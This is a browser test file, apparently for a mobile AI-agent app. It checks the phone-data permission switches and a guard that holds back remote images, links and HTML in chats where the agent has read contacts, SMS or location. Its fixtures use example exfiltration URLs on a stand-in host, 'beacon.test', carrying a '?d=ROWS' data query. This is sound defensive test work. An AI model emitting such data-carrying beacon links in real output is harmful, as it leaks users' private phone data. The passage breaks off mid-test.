// Settings → Phone data for the agent: master + per-kind switches, decided by the shell (faked here: window.__pd is the
// shell's state and window.__pd.result its answer to phoneDataSet). The page only flips a switch on "ok".
// Not covered here, because it is Java: the biometric itself, Android's permission dialog, the generation counter that
// lets an off win over an on in flight, the switch cleared when a permission is seen missing, and blocked detection.
// Those were only compiled; they need a real phone (docs/status/phone-data.md).
const { WEB, MOCK, check, sleep, nativeShell, png } = require('../lib.cjs')

module.exports = async t => {
  const { browser } = t
  const open = async (pd, { bridge = true } = {}) => {
    const pg = await browser.newPage({ viewport: { width: 375, height: 812 } })
    await pg.addInitScript(nativeShell)
    if (bridge) {
      await pg.addInitScript(pd => {
        window.__pd = pd
        window.__pdCalls = []
        const kinds = ['contacts', 'calendar', 'calls', 'sms', 'location', 'photos']
        const state = () => ({
          ready: pd.ready,
          master: !!pd.switches.master,
          kinds: Object.fromEntries(kinds.map(k => [k, !!(pd.switches.master && pd.switches[k] && pd.perms[k])])),
          switches: pd.switches,
          removed: pd.removed || {},
          perms: pd.perms,
          secure: pd.secure
        })
        Object.assign(window.HermesAndroid, {
          phoneDataState: key => JSON.stringify(state()),
          phoneDataSet: (key, id, kind, on) => {
            window.__pdCalls.push({ key, kind, on })
            if (!on) {
              pd.switches[kind] = false
              setTimeout(() => window.hermesPhoneData(id, 'ok'), 10)
              return
            }
            setTimeout(() => {
              if (pd.result === 'ok') {
                pd.switches[kind] = true
                if (kind !== 'master') pd.perms[kind] = true
              }
              window.hermesPhoneData(id, pd.result)
            }, 40)
          },
          phoneDataOpenSettings: key => window.__pdCalls.push({ key, settings: true })
        })
      }, pd)
    }
    await pg.goto(WEB + '/')
    await pg.getByPlaceholder('Message Hermux').waitFor({ timeout: 15000 })
    await pg.getByRole('button', { name: /^Sessions/ }).click()
    await pg.locator('.nav-tile', { hasText: 'Settings' }).click()
    await pg.locator('.screen .title', { hasText: 'Settings' }).waitFor({ timeout: 5000 })
    return pg
  }
  const fresh = (over = {}) => ({ ready: true, secure: true, result: 'ok', switches: {}, perms: {}, ...over })
  const row = (pg, text) => pg.locator('.set-row', { hasText: text }).first()
  const sw = (pg, text) => row(pg, text).getByRole('switch')
  const isOn = async (pg, text) => (await sw(pg, text).getAttribute('aria-checked', { timeout: 1500 }).catch(() => null)) === 'true'
  const calls = pg => pg.evaluate(() => window.__pdCalls)
  const MASTER = 'Let the agent read phone data'
  const KINDS = ['Contacts', 'Calendar', 'Call log', 'Messages (SMS)', 'Location (approximate)', 'Latest photos']

  {
    // not ready, or no bridge: hidden
    let pg = await open(fresh({ ready: false }))
    check((await pg.getByText('Phone data for the agent').count()) === 0, 'phone data: hidden when the feature is not ready')
    await pg.close()
    pg = await open(fresh(), { bridge: false })
    check((await pg.getByText('Phone data for the agent').count()) === 0, 'phone data: hidden without the native methods')
    await pg.close()
  }
  {
    const pg = await open(fresh())
    await row(pg, MASTER).waitFor({ timeout: 5000 })
    check(!(await isOn(pg, MASTER)), 'phone data: the master switch starts off')
    check((await pg.getByText('Applies to new chats.').count()) > 0 && (await pg.getByText(/Results go to your chosen model provider/).count()) > 0, 'phone data: the footer explains where results go')
    for (const k of KINDS) check((await row(pg, k).isVisible().catch(() => false)) === false, `phone data: ${k} is hidden while the master is off`)

    // turn the master on: the shell is asked, the switch flips on "ok"
    await row(pg, MASTER).click()
    await sleep(400)
    let c = await calls(pg)
    check(c.length === 1 && c[0].key === 'K' && c[0].kind === 'master' && c[0].on === true, `phone data: turning the master on calls phoneDataSet with the key (${JSON.stringify(c)})`)
    check(await isOn(pg, MASTER), 'phone data: the master flips on after ok')
    for (const k of KINDS) {
      await row(pg, k).waitFor({ timeout: 3000 }).then(() => check(true, `phone data: ${k} row shows`), () => check(false, `phone data: ${k} row shows`))
      check(!(await isOn(pg, k)), `phone data: ${k} starts off`)
    }
    check((await pg.getByText('Date, size and dimensions only. Never the pictures').count()) > 0, 'phone data: photos say details only')

    // a kind on ok
    await row(pg, 'Contacts').click()
    await sleep(400)
    check(await isOn(pg, 'Contacts'), 'phone data: a kind flips on after ok')

    // turning off: instant, no prompt, no permission
    await row(pg, 'Contacts').click()
    await sleep(250)
    c = await calls(pg)
    check(!(await isOn(pg, 'Contacts')) && c[c.length - 1].on === false, 'phone data: turning a kind off is immediate')
    check((await pg.locator('.sheet').count()) === 0 && (await pg.getByText('Not changed').count()) === 0, 'phone data: turning off shows no prompt')
    await pg.close()
  }
  for (const [result, msg] of [['cancel', 'Not changed: confirm it’s you to change this'], ['nolock', 'Set a screen lock first'], ['denied', 'Android refused the permission']]) {
    const pg = await open(fresh({ result }))
    await row(pg, MASTER).click()
    await pg.getByText(msg).first().waitFor({ timeout: 3000 }).then(() => check(true, `phone data: ${result} shows "${msg}"`), () => check(false, `phone data: ${result} shows "${msg}"`))
    check(!(await isOn(pg, MASTER)), `phone data: ${result} leaves the master off`)
    await pg.close()
  }
  {
    // denied for a kind stays off; blocked shows the way to Android settings
    const pg = await open(fresh({ switches: { master: true }, result: 'blocked' }))
    await row(pg, 'Calendar').click()
    await row(pg, 'Allow it in Android settings').waitFor({ timeout: 3000 }).then(() => check(true, 'phone data: blocked shows the Android settings row'), () => check(false, 'phone data: blocked shows the Android settings row'))
    check(!(await isOn(pg, 'Calendar')), 'phone data: blocked leaves the kind off')
    await row(pg, 'Allow it in Android settings').click()
    await sleep(200)
    check((await calls(pg)).some(c => c.settings && c.key === 'K'), 'phone data: the row opens Android settings')
    await pg.close()
  }
  {
    // permission removed by Android: shows off with the reason, turning on goes through the normal flow
    // (the shell has already cleared the switch and set the removed flag)
    const pg = await open(fresh({ switches: { master: true }, removed: { sms: true }, perms: { sms: false } }))
    await row(pg, 'Messages (SMS)').waitFor({ timeout: 5000 })
    check(!(await isOn(pg, 'Messages (SMS)')), 'phone data: a kind whose permission is gone shows off')
    check((await row(pg, 'Messages (SMS)').innerText()).includes('Android removed this permission'), 'phone data: it says Android removed the permission')
    await row(pg, 'Messages (SMS)').click()
    await sleep(400)
    const c = await calls(pg)
    check(c.length === 1 && c[0].kind === 'sms' && c[0].on === true && (await isOn(pg, 'Messages (SMS)')), 'phone data: turning it on again goes through phoneDataSet')
    await pg.close()
  }
  {
    // coming back to the foreground re-reads the state
    const pg = await open(fresh())
    await row(pg, MASTER).waitFor({ timeout: 5000 })
    check(!(await isOn(pg, MASTER)), 'phone data: foreground re-read starts with the master off')
    await pg.evaluate(() => {
      window.__pd.switches.master = true
      window.__pd.removed = { calls: true }
      document.dispatchEvent(new Event('visibilitychange'))
    })
    await row(pg, 'Call log').waitFor({ timeout: 3000 }).then(() => check(true, 'phone data: coming back to the foreground re-reads the switches'), () => check(false, 'phone data: coming back to the foreground re-reads the switches'))
    check(await isOn(pg, MASTER), 'phone data: the master shows the re-read state')
    check((await row(pg, 'Call log').innerText()).includes('Android removed this permission'), 'phone data: a removed permission shows after the re-read')
    await pg.close()
  }
  {
    // Settings search finds it
    const pg = await open(fresh())
    await pg.getByLabel('Search settings').fill('phone data')
    await pg.locator('.set-row', { hasText: 'Let the agent read phone data' }).first().waitFor({ timeout: 3000 }).then(() => check(true, 'phone data: Settings search finds it'), () => check(false, 'phone data: Settings search finds it'))
    await pg.close()
  }
  {
    // A phone_data result is the user's own text (an SMS can carry a URL): opening its card shows plain text only, with no media
    // preview, no fetch and no link. Another tool's card with the same text still has both.
    const pg = await browser.newPage({ viewport: { width: 375, height: 812 } })
    await pg.addInitScript(nativeShell)
    await pg.addInitScript(() => {
      window.__socks = []
      window.__sid = ''
      const Orig = window.WebSocket
      window.WebSocket = class extends Orig {
        constructor(...a) {
          super(...a)
          window.__socks.push(this)
          this.addEventListener('message', e => {
            try {
              const m = JSON.parse(e.data)
              if (m.params && m.params.session_id) window.__sid = m.params.session_id
            } catch {
              /* not JSON */
            }
          })
        }
      }
    })
    const hits = []
    await pg.route('http://beacon.test/**', r => {
      hits.push(r.request().url())
      return r.fulfill({ status: 200, contentType: 'image/png', body: png })
    })
    await pg.goto(WEB + '/')
    const box = pg.getByPlaceholder('Message Hermux')
    await box.waitFor({ timeout: 15000 })
    await box.fill('hello')
    await pg.locator('.composer').getByRole('button', { name: 'Send' }).click()
    await pg.waitForFunction(() => window.__sid, null, { timeout: 8000 })
    await sleep(2500)
    const text = 'Your code is at http://beacon.test/track.png?u=1 and see http://beacon.test/page'
    const tool = (name, id) =>
      pg.evaluate(([name, id, text]) => {
        const s = window.__socks.filter(x => x.readyState === 1).pop()
        const ev = (type, payload) => s.dispatchEvent(new MessageEvent('message', { data: JSON.stringify({ jsonrpc: '2.0', method: 'event', params: { type, session_id: window.__sid, payload } }) }))
        ev('tool.start', { tool_id: id, name, args: { kind: 'sms' } })
        ev('tool.complete', { tool_id: id, name, args: { kind: 'sms' }, duration_s: 0.1, result: text })
      }, [name, id, text])
    const expandAll = async () => {
      for (let k = 0; k < 3; k++) {
        const runs = pg.locator('.tool-run[aria-expanded="false"]')
        if (!(await runs.count())) break
        await runs.first().click()
        await sleep(200)
      }
      const heads = pg.locator('.tool-head')
      for (let k = 0; k < (await heads.count()); k++) if ((await heads.nth(k).getAttribute('aria-expanded')) !== 'true') await heads.nth(k).click()
      await sleep(700)
    }
    const card = name =>
      pg.evaluate(name => {
        const c = [...document.querySelectorAll('.tool')].find(x => x.querySelector('.tool-name')?.getAttribute('title') === name)
        return c && { imgs: c.querySelectorAll('img, video, audio').length, holds: c.querySelectorAll('.remote-hold').length, links: c.querySelectorAll('a').length, text: c.innerText }
      }, name)
    await tool('phone_data', 'pdtool-1')
    await sleep(500)
    await expandAll()
    const pdc = await card('phone_data')
    check(pdc && pdc.text.includes('http://beacon.test/track.png?u=1'), 'phone data card: the result text is shown as it is')
    check(pdc && pdc.imgs === 0 && pdc.links === 0, `phone data card: no media preview and no link (${JSON.stringify(pdc && { imgs: pdc.imgs, links: pdc.links })})`)
    check(hits.length === 0, `phone data card: opening it fetches nothing (${JSON.stringify(hits)})`)
    await tool('terminal', 'othertool-1')
    await sleep(500)
    await expandAll()
    const oth = await card('terminal')
    // The chat has read phone data, so another tool's card (a URL in a terminal output) holds its media behind a tap too; its links stay (they ask first).
    check(oth && oth.imgs === 0 && oth.holds > 0 && oth.links > 0 && hits.length === 0, `phone data card: another tool's card in this chat holds its media behind a tap, keeps its links, fetches nothing (${JSON.stringify(oth && { imgs: oth.imgs, holds: oth.holds, links: oth.links })}, ${hits.length} fetches)`)
    await pg.close()
  }
  {
    // A chat that has read phone data (a phone_data tool item, whatever its outcome): text the agent wrote can't load anything
    // remote before a tap, and an address is shown in full before it opens. Every access mode, Full access included. A chat
    // with no phone_data call is unchanged. Derived from the chat's items, so it comes back with a reload.
    const hits = []
    const setup = async sid => {
      const pg = await browser.newPage({ viewport: { width: 375, height: 812 } })
      await pg.addInitScript(sid => {
        localStorage.setItem('hm.lastSession', JSON.stringify({ id: sid, profile: 'default' }))
        window.__opened = []
        window.open = u => (window.__opened.push(String(u)), null) // openExternal's browser path
        window.__socks = []
        const Orig = window.WebSocket
        window.WebSocket = class extends Orig {
          constructor(...a) {
            super(...a)
            window.__socks.push(this)
          }
        }
      }, sid)
      await pg.route(/^https?:\/\/beacon\.test\//, r => {
        hits.push(r.request().url())
        return r.fulfill({ status: 200, contentType: 'image/png', body: png })
      })
      await pg.goto(WEB + '/')
      await pg.locator('.msg.assistant').first().waitFor({ timeout: 15000 })
      await sleep(700)
      return pg
    }
    const media = pg => pg.evaluate(() => ({ imgs: [...document.querySelectorAll('.msg.assistant img.media')].length, holds: [...document.querySelectorAll('.msg.assistant .remote-hold')].map(h => h.innerText) }))
    const dialogText = pg => pg.locator('.dialog').innerText({ timeout: 3000 }).catch(() => null)
    const opened = pg => pg.evaluate(() => window.__opened)

    // control: no phone_data call -> exactly as before
    hits.length = 0
    let pg = await setup('s-pd-ctl')
    let m = await media(pg)
    check(m.imgs === 1 && m.holds.length === 0 && hits.some(h => h.includes('/p.png')), `phone data taint: a chat with no phone_data call loads its image as before (${JSON.stringify(m)}, ${hits.length} fetches)`)
    await pg.locator('.msg.assistant a', { hasText: 'see more' }).click()
    await sleep(300)
    check((await pg.locator('.dialog').count()) === 0 && (await opened(pg)).length === 1 && (await opened(pg))[0].includes('/page?d=ROWS'), 'phone data taint: a link in a chat with no phone_data call opens at once')
    await pg.locator('.hm-openui').last().getByRole('button', { name: 'Visit site' }).click({ timeout: 15000 })
    await sleep(300)
    check((await pg.locator('.dialog').count()) === 0 && (await opened(pg)).some(u => u.startsWith('https://beacon.test/card')), 'phone data taint: a card open_url in a chat with no phone_data call opens at once')

    // taint appears while the items are already drawn: the image goes back behind a tap
    await pg.evaluate(() => {
      const s = window.__socks.filter(x => x.readyState === 1).pop()
      const ev = (type, payload) => s.dispatchEvent(new MessageEvent('message', { data: JSON.stringify({ jsonrpc: '2.0', method: 'event', params: { type, session_id: 'rt-s-pd-ctl', payload } }) }))
      ev('tool.start', { tool_id: 'pd-live', name: 'phone_data', args: { kind: 'sms' } })
      ev('tool.complete', { tool_id: 'pd-live', name: 'phone_data', args: { kind: 'sms' }, duration_s: 0.1, result: 'x' })
    })
    await sleep(700)
    m = await media(pg)
    check(m.imgs === 0 && m.holds.length === 1, `phone data taint: a read that happens after the reply was drawn covers it too (${JSON.stringify(m)})`)
    await pg.close()

    // tainted: nothing before the tap
    hits.length = 0
    pg = await setup('s-pd')
    m = await media(pg)
    check(m.imgs === 0 && m.holds.length === 1 && /beacon\.test/.test(m.holds[0]) && /Tap to load/.test(m.holds[0]), `phone data taint: the image waits behind its host name and "Tap to load" (${JSON.stringify(m)})`)
    check(hits.length === 0, `phone data taint: no network request before the tap (${JSON.stringify(hits)})`)
    await pg.locator('.msg.assistant .remote-hold').click()
    await sleep(700)
    m = await media(pg)
    check(m.imgs === 1 && hits.some(h => h.includes('/p.png?d=ROWS')), `phone data taint: it loads after the tap (${JSON.stringify(m)})`)

    // links and cards show the address first
    await pg.locator('.msg.assistant a', { hasText: 'see more' }).click()
    const d1 = await dialogText(pg)
    check(d1 && d1.includes('http://beacon.test/page?d=ROWS') && /Site: beacon\.test/.test(d1) && d1.includes('?d=ROWS'), `phone data taint: a link shows the full address, host and query first (${d1})`)
    check((await opened(pg)).length === 0, 'phone data taint: and has opened nothing yet')
    await pg.locator('.dialog').getByRole('button', { name: 'Cancel' }).click()
    await sleep(300)
    check((await opened(pg)).length === 0, 'phone data taint: Cancel opens nothing')
    await pg.locator('.msg.assistant a', { hasText: 'see more' }).click()
    await pg.locator('.dialog').getByRole('button', { name: 'Open' }).click()
    await sleep(300)
    check((await opened(pg)).length === 1 && (await opened(pg))[0] === 'http://beacon.test/page?d=ROWS', 'phone data taint: Open on the dialog opens it')
    await pg.locator('.hm-openui').last().getByRole('button', { name: 'Visit site' }).click({ timeout: 15000 })
    const d2 = await dialogText(pg)
    check(d2 && d2.includes('https://beacon.test/card?d=ROWS') && (await opened(pg)).length === 1, `phone data taint: a card open_url shows the address first and opens nothing yet (${d2})`)
    await pg.locator('.dialog').getByRole('button', { name: 'Cancel' }).click()
    await sleep(300)

    // a new load: derived from the items, so it comes back
    hits.length = 0
    await pg.reload()
    await pg.locator('.msg.assistant').first().waitFor({ timeout: 15000 })
    await sleep(900)
    m = await media(pg)
    check(m.imgs === 0 && m.holds.length === 1 && hits.length === 0, `phone data taint: survives a page reload (${JSON.stringify(m)}, ${hits.length} fetches)`)

    // Full access (the app's /yolo) does not lift it
    await pg.getByPlaceholder('Message Hermux').fill('/yolo on')
    await pg.locator('.composer').getByRole('button', { name: 'Send' }).click()
    await sleep(900)
    m = await media(pg)
    check(m.imgs === 0 && m.holds.length === 1 && hits.length === 0, `phone data taint: Full access still holds the image (${JSON.stringify(m)}, ${hits.length} fetches)`)
    await pg.close()
  }
  {
    // The routes that loaded with no tap, in a chat that has read phone data (the shell's own filter, RemoteGuard.java, is
    // the enforcement and is Java: only compiled and unit-tested). Here: the page holds back card images, Mermaid image
    // shapes and srcset, guards tool cards, notices, subagent text and the canvas, and reports its state to the shell.
    const hits = []
    const setup = async sid => {
      const pg = await browser.newPage({ viewport: { width: 375, height: 812 } })
      await pg.addInitScript(nativeShell)
      await pg.addInitScript(sid => {
        localStorage.setItem('hm.lastSession', JSON.stringify({ id: sid, profile: 'default' }))
        window.__opened = []
        window.open = u => (window.__opened.push(String(u)), null)
        window.__sid = 'rt-' + sid
        window.__remote = [] // the shell's side, stubbed: what the page told remoteBlock / remoteAllowOnce
        Object.assign(window.HermesAndroid, {
          remoteBlock: (key, on) => window.__remote.push({ block: on, key }),
          remoteAllowOnce: (key, url) => window.__remote.push({ allow: url, key })
        })
        window.__socks = []
        const Orig = window.WebSocket
        window.WebSocket = class extends Orig {
          constructor(...a) {
            super(...a)
            window.__socks.push(this)
            this.addEventListener('message', e => {
              try {
                const m = JSON.parse(e.data)
                if (m.params && m.params.session_id) window.__sid = m.params.session_id
              } catch {
                /* not JSON */
              }
            })
          }
        }
      }, sid)
      for (const scheme of ['http', 'https'])
        await pg.route(`${scheme}://beacon.test/**`, r => {
          hits.push(r.request().url())
          return r.fulfill({ status: 200, contentType: 'image/png', body: png })
        })
      await pg.goto(WEB + '/')
      await pg.locator('.msg.assistant').first().waitFor({ timeout: 15000 })
      await sleep(1500)
      return pg
    }
    const ev = (pg, list) =>
      pg.evaluate(list => {
        const s = window.__socks.filter(x => x.readyState === 1).pop()
        const sid = window.__sid
        for (const [type, payload] of list) s.dispatchEvent(new MessageEvent('message', { data: JSON.stringify({ jsonrpc: '2.0', method: 'event', params: { type, session_id: sid, payload } }) }))
      }, list)
    const expand = async pg => {
      for (let k = 0; k < 3; k++) {
        const runs = pg.locator('.tool-run[aria-expanded="false"]')
        if (!(await runs.count())) break
        await runs.first().click()
        await sleep(200)
      }
      const heads = pg.locator('.tool-head')
      for (let k = 0; k < (await heads.count()); k++) if ((await heads.nth(k).getAttribute('aria-expanded')) !== 'true') await heads.nth(k).click()
      await sleep(700)
    }
    const remote = pg => pg.evaluate(() => window.__remote)
    const runCanvas = async (pg, html) => {
      await pg.getByRole('button', { name: 'Canvas' }).first().click()
      await pg.locator('.canvas-panel').waitFor({ timeout: 5000 })
      await pg.getByRole('button', { name: 'New document' }).first().click()
      await pg.locator('.picker-opt, .set-row', { hasText: 'Web page' }).click()
      await pg.locator('.dialog input').fill('Page')
      await pg.locator('.dialog button', { hasText: 'Create' }).click()
      await pg.locator('textarea.editor-text').waitFor({ timeout: 5000 })
      await pg.locator('textarea.editor-text').fill(html)
      await pg.locator('.canvas-toolbar .seg button', { hasText: 'Run' }).click()
      await sleep(1000)
    }
    const cardImgs = pg => pg.evaluate(() => [...document.querySelectorAll('.hm-openui')].flatMap(h => [...(h.shadowRoot || h).querySelectorAll('img')].map(i => i.getAttribute('src') || '')))

    // ── the card, Mermaid and srcset routes ──
    hits.length = 0
    let pg = await setup('s-pd-leaks')
    let imgs = await cardImgs(pg)
    check(imgs.every(s => !/beacon\.test/.test(s)) && hits.length === 0, `phone data leaks: a card's image components fetch nothing in this chat (${JSON.stringify(imgs)}, ${JSON.stringify(hits)})`)
    check((await pg.locator('.warn-line', { hasText: 'Images from the web are held back' }).count()) === 1, 'phone data leaks: the card says its images are held back')
    const mm = await pg.evaluate(() => [...document.querySelectorAll('.msg.assistant .codeblock-bar')].map(b => b.innerText).join('|') + '#' + document.querySelectorAll('.msg.assistant .mermaid-box').length)
    check(/mermaid \(not drawn/.test(mm) && mm.endsWith('#0'), `phone data leaks: a Mermaid diagram with an image shape is shown as code (${mm})`)
    const pic = await pg.evaluate(() => document.querySelectorAll('.msg.assistant picture, .msg.assistant source, .msg.assistant [srcset]').length)
    check(pic === 0 && hits.length === 0, `phone data leaks: no picture, source or srcset is left in the reply (${pic}, ${JSON.stringify(hits)})`)
    let rem = await remote(pg)
    check(rem.length > 0 && rem.every(r => r.key === 'K') && rem[rem.length - 1].block === true, `phone data leaks: the page told the shell this chat has read phone data (${JSON.stringify(rem)})`)

    // reload: the page reports again, and still nothing is fetched
    hits.length = 0
    await pg.reload()
    await pg.locator('.msg.assistant').first().waitFor({ timeout: 15000 })
    await sleep(1200)
    rem = await remote(pg)
    check(rem.some(r => r.block === true) && rem[rem.length - 1].block === true && hits.length === 0, `phone data leaks: after a reload the shell is told again, nothing is fetched (${JSON.stringify(rem)}, ${hits.length} fetches)`)

    // ── tool card, notice, subagent text ──
    await ev(pg, [
      ['tool.start', { tool_id: 'rf-1', name: 'read_file', args: { path: '/a' } }],
      ['tool.complete', { tool_id: 'rf-1', name: 'read_file', args: { path: '/a' }, duration_s: 0.1, result: 'saved http://beacon.test/tool.png?d=ROWS' }],
      ['review.summary', { text: '![n](http://beacon.test/notice.png?d=ROWS)' }],
      ['subagent.start', { subagent_id: 'sa1', goal: 'look at http://beacon.test/goal?d=ROWS', status: 'running' }]
    ])
    await sleep(500)
    await expand(pg)
    const spots = await pg.evaluate(() => ({
      tool: [...document.querySelectorAll('.tool')].filter(c => c.querySelector('.tool-name')?.getAttribute('title') === 'read_file').map(c => [c.querySelectorAll('img').length, c.querySelectorAll('.remote-hold').length]),
      notice: [document.querySelectorAll('.notice img').length, document.querySelectorAll('.notice .remote-hold').length]
    }))
    check(spots.tool.length === 1 && spots.tool[0][0] === 0 && spots.tool[0][1] === 1 && hits.length === 0, `phone data leaks: a tool card's media waits behind a tap (${JSON.stringify(spots.tool)}, ${JSON.stringify(hits)})`)
    check(spots.notice[0] === 0 && spots.notice[1] === 1, `phone data leaks: a notice's image waits behind a tap (${JSON.stringify(spots.notice)})`)
    await pg.locator('.sub-goal a').click()
    const dlg = await pg.locator('.dialog').innerText({ timeout: 3000 }).catch(() => null)
    check(dlg && dlg.includes('Site: beacon.test') && dlg.includes('?d=ROWS') && (await pg.evaluate(() => window.__opened)).length === 0, `phone data leaks: a link in a subagent's goal shows its address first (${dlg})`)
    await pg.locator('.dialog').getByRole('button', { name: 'Cancel' }).click()

    // the placeholder says when the address carries data, and its tap asks the shell to pass exactly that address
    const hold = pg.locator('.notice .remote-hold')
    const holdText = await hold.innerText()
    check(/beacon\.test/.test(holdText) && /has data in the address/.test(holdText) && /Tap to load/.test(holdText), `phone data leaks: the placeholder shows the host and that the address carries data (${holdText})`)
    await hold.click()
    await sleep(600)
    rem = await remote(pg)
    check(rem.some(r => r.allow === 'http://beacon.test/notice.png?d=ROWS') && hits.some(h => h.includes('/notice.png?d=ROWS')), `phone data leaks: its tap passes exactly that address to the shell, then loads (${JSON.stringify(rem.filter(r => r.allow))})`)

    // the canvas: in this chat an HTML page is not run at all (WebRTC and DNS prefetch would get past the frame's policy)
    await runCanvas(pg, '<img src="http://beacon.test/canvas.png?d=ROWS">')
    const held = await pg.evaluate(() => ({ frames: document.querySelectorAll('iframe').length, note: document.querySelector('.html-held .html-note')?.textContent || '', src: document.querySelector('.html-held .html-src')?.textContent || '' }))
    check(held.frames === 0 && /HTML previews are off/.test(held.note) && /canvas\.png/.test(held.src) && !hits.some(h => h.includes('/canvas.png')), `phone data leaks: a canvas page in this chat renders no frame, shows its source as text (${JSON.stringify(held)})`)
    await pg.close()

    // ── control: no phone_data call, all of it as before ──
    hits.length = 0
    pg = await setup('s-pd-leaks-ctl')
    imgs = await cardImgs(pg)
    check(imgs.some(s => /card-image\.png\?d=ROWS/.test(s)) && (await pg.locator('.warn-line', { hasText: 'held back' }).count()) === 0, `phone data leaks, control: a chat with no phone_data call shows its card's images (${JSON.stringify(imgs)})`)
    const mm2 = await pg.evaluate(() => [...document.querySelectorAll('.msg.assistant .codeblock-bar')].map(b => b.innerText).join('|'))
    check(!/not drawn: it names an image/.test(mm2), `phone data leaks, control: its Mermaid diagram is never held for this reason (${mm2})`)
    rem = await remote(pg)
    check(rem.length > 0 && rem.every(r => r.block === false), `phone data leaks, control: the shell is told it is not blocked (${JSON.stringify(rem)})`)
    await ev(pg, [
      ['tool.start', { tool_id: 'rf-1', name: 'read_file', args: { path: '/a' } }],
      ['tool.complete', { tool_id: 'rf-1', name: 'read_file', args: { path: '/a' }, duration_s: 0.1, result: 'saved http://beacon.test/tool.png?d=ROWS' }],
      ['review.summary', { text: '![n](http://beacon.test/notice.png?d=ROWS)' }],
      ['subagent.start', { subagent_id: 'sa1', goal: 'look at http://beacon.test/goal?d=ROWS', status: 'running' }]
    ])
    await sleep(600)
    await expand(pg)
    const ctl = await pg.evaluate(() => ({ holds: document.querySelectorAll('.remote-hold').length, noticeImg: document.querySelectorAll('.notice img').length }))
    check(ctl.holds === 0 && ctl.noticeImg === 1 && hits.some(h => h.includes('/tool.png')), `phone data leaks, control: a tool card and a notice load their images as before (${JSON.stringify(ctl)})`)
    await pg.locator('.sub-goal a').click()
    await sleep(300)
    check((await pg.locator('.dialog').count()) === 0 && (await pg.evaluate(() => window.__opened)).some(u => u.includes('/goal?d=ROWS')), 'phone data leaks, control: a subagent goal link opens at once')
    // control: an HTML page in a chat with no phone_data call still runs in its frame
    await runCanvas(pg, '<p>hello</p>')
    const frames = await pg.evaluate(() => ({ frames: document.querySelectorAll('iframe.html-frame').length, held: document.querySelectorAll('.html-held').length }))
    check(frames.frames > 0 && frames.held === 0, `phone data leaks, control: a canvas page in a chat with no phone_data call still runs in its frame (${JSON.stringify(frames)})`)
    await pg.locator('.canvas-panel').getByRole('button', { name: /close/i }).first().click().catch(() => {})
    await sleep(300)

    // a subagent that never named phone_data changes nothing; one whose own tool event names it makes the chat count
    await ev(pg, [['subagent.tool', { subagent_id: 'sa1', tool_name: 'terminal', status: 'running' }]])
    await sleep(400)
    check((await pg.locator('.remote-hold').count()) === 0, 'phone data leaks, control: a subagent tool event for another tool changes nothing')
    await ev(pg, [['subagent.tool', { subagent_id: 'sa1', tool_name: 'phone_data', status: 'running' }]])
    await sleep(700)
    const after = await pg.evaluate(() => ({ holds: document.querySelectorAll('.remote-hold').length, imgs: document.querySelectorAll('.msg.assistant img.media, .notice img').length }))
    check(after.holds > 0 && after.imgs === 0, `phone data leaks: a subagent whose own tool event names phone_data makes the chat count (${JSON.stringify(after)})`)
    rem = await remote(pg)
    check(rem[rem.length - 1].block === true, `phone data leaks: the shell is told at that moment, the first phone_data call (${JSON.stringify(rem)})`)

    // chat switch: untainted -> tainted -> untainted, the shell follows each time
    await pg.evaluate(() => window.hermesOpenSession('s-pd'))
    await sleep(1200)
    const toTainted = (await remote(pg)).slice(-1)[0]
    await pg.evaluate(() => window.hermesOpenSession('s-pd-ctl'))
    await sleep(1200)
    const toCtl = (await remote(pg)).slice(-1)[0]
    check(toTainted.block === true && toCtl.block === false, `phone data leaks: switching chats tells the shell each time (${JSON.stringify([toTainted, toCtl])})`)
    await pg.close()
  }
  {
    // A long chat whose phone_data call is older than the items the page has (a cached preview keeps 60; Hermes resumes only the
    // tip segment): the items show nothing, but the app's own record (stubbed phoneDataTainted) knows the chat. The page asks
    // it before drawing, so nothing loads and the shell is told "blocked" from the first report, preview included.
    const hits = []
    const open = async (sid, ids) => {
      const pg = await browser.newPage({ viewport: { width: 375, height: 812 } })
      await pg.addInitScript(nativeShell)
      await pg.addInitScript(sid => {
        localStorage.setItem('hm.lastSession', JSON.stringify({ id: sid, profile: 'default' }))
        window.__remote = []
        Object.assign(window.HermesAndroid, { remoteBlock: (key, on) => window.__remote.push({ block: on, key }), remoteAllowOnce: () => {} })
      }, sid)
      await pg.addInitScript(ids => {
        window.__tcalls = []
        Object.assign(window.HermesAndroid, { phoneDataTainted: (key, id) => (window.__tcalls.push(id), ids.includes(id)) })
      }, ids)
      for (const scheme of ['http', 'https'])
        await pg.route(`${scheme}://beacon.test/**`, r => {
          hits.push(r.request().url())
          return r.fulfill({ status: 200, contentType: 'image/png', body: png })
        })
      await pg.goto(WEB + '/')
      await pg.locator('.msg.assistant').first().waitFor({ timeout: 15000 })
      await sleep(1500)
      return pg
    }
    const state = pg => pg.evaluate(() => ({ remote: window.__remote, asked: window.__tcalls, imgs: [...document.querySelectorAll('.hm-openui')].flatMap(h => [...(h.shadowRoot || h).querySelectorAll('img')].map(i => i.getAttribute('src') || '')) }))
    let pg = await open('s-pd-leaks-ctl', ['s-pd-leaks-ctl'])
    let st = await state(pg)
    check(st.asked.includes('s-pd-leaks-ctl') && st.remote.length > 0 && st.remote.every(r => r.block === true), `phone data native record: a chat the app knows is blocked though its items show no phone_data call (${JSON.stringify(st.remote)})`)
    check(st.imgs.every(s => !/beacon\.test/.test(s)) && hits.length === 0, `phone data native record: and its card images fetch nothing (${JSON.stringify(st.imgs)}, ${JSON.stringify(hits)})`)
    // reload: the cached preview is drawn first; the page must already have asked, and never report "not blocked"
    hits.length = 0
    await pg.reload()
    await pg.locator('.msg.assistant').first().waitFor({ timeout: 15000 })
    await sleep(1200)
    st = await state(pg)
    check(st.remote.length > 0 && st.remote.every(r => r.block === true) && hits.length === 0, `phone data native record: after a reload (the cached preview path) it is never reported as not blocked (${JSON.stringify(st.remote)}, ${hits.length} fetches)`)
    await pg.close()
    // control: the app has no record of this chat: unchanged
    hits.length = 0
    pg = await open('s-pd-leaks-ctl', [])
    st = await state(pg)
    check(st.asked.length > 0 && st.remote.length > 0 && st.remote.every(r => r.block === false) && st.imgs.some(s => /card-image\.png\?d=ROWS/.test(s)), `phone data native record, control: a chat the app has no record of is not blocked and shows its card images (${JSON.stringify(st.remote)}, ${JSON.stringify(st.imgs)})`)
    await pg.close()
  }
  {
    // Round 3: the chat's whole lineage is asked about (a compression gives a new stored id, a restart a new live id); a bridge that
    // throws means "read"; a saved document is judged by ITS chat, not the one on screen; a bare mailto: link never skips the dialog.
    const hits = []
    const open = async (sid, { ids = [], lineage = null, throws = false, anyRead = false, noMethod = false } = {}) => {
      const pg = await browser.newPage({ viewport: { width: 375, height: 812 } })
      await pg.addInitScript(nativeShell)
